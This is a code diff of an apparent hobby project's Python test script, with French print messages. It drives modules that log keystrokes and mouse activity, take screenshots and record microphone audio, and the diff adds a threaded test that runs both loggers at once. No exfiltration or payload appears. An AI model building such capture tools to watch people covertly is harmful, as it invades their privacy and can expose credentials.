@@ -7,10 +7,25 @@ import Mouselogger
 def main():
 
     # test_keylog(5)
-    # test_mouselog(1)
+    # test_mouselog(5)
     # test_getImage()
-    # test_getSound()
+    # test_getSound(2)
+    test_threading()
 
+
+def test_threading():
+    klog = keylog.KeyLogger()
+    mlog = Mouselogger.Mouselog()
+    print("objets intanciés")
+    klog.start()
+    print("keylog lancé")
+    mlog.start()
+    print("mouselog lancé")
+    time.sleep(5)
+    klog.stop()
+    print("keylog arrêté")
+    mlog.stop()
+    print("mouselog arrêté")
 
 def test_keylog(waittime):
     klog = keylog.KeyLogger()
@@ -35,9 +50,9 @@ def test_getImage():
     screen.takeScreen()
     screen.takeScreen("test/image.png")
 
-def test_getSound():
+def test_getSound(duration):
     sound = getSound.getSound()
-    sound.record(2)
+    sound.record(duration)
     sound.write_on_file("test/sound.wav")
 
 if __name__ == "__main__":
